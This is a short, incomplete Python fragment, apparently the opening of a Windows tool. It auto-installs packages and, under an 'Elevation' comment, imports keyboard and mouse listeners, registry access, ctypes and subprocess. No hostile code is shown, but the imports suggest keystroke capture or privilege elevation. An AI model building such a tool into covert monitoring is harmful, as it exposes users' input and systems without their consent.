# 🔧 Autoloader: Ritualized Dependency Ingest
...
# 🔮 Required packages
required = ["opencv-python", "psutil", "pynput"]

autoload(required)

# 🔐 Elevation
import os, ctypes, tkinter as tk, time, threading, uuid, json, psutil, cv2
from pynput import keyboard, mouse
import subprocess, winreg, sys
